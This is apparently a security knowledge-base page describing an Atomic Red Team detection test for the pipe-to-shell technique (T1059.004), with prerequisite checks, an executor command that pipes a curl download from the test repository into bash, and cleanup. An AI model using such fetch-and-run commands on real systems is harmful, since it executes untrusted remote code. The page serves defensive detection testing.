---
atomic_guid: "fca246a8-a585-4f28-a2df-6495973976a1"
title: "Detecting pipe-to-shell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.004"
attack_technique_name: "Command and Scripting Interpreter: Bash"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.004/T1059.004.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "fca246a8-a585-4f28-a2df-6495973976a1"
  - "Detecting pipe-to-shell"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Detecting pipe-to-shell

An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.

## Metadata

- Atomic GUID: fca246a8-a585-4f28-a2df-6495973976a1
- Technique: T1059.004: Command and Scripting Interpreter: Bash
- Platforms: linux
- Executor: sh
- Elevation Required: False
- Dependency Executor: bash
- Source Path: atomics/T1059.004/T1059.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.004]]

## Input Arguments

### remote_url

- description: url of remote payload
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh

## Dependencies

Check if curl is installed on the machine.

### Prerequisite Check

```bash
if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
```

### Get Prerequisite

```bash
which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
```

## Executor

- elevation_required: False
- name: sh

### Command

```bash
cd /tmp
curl -s #{remote_url} |bash
ls -la /tmp/art.txt
```

### Cleanup

```bash
rm /tmp/art.txt
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.004/T1059.004.yaml)
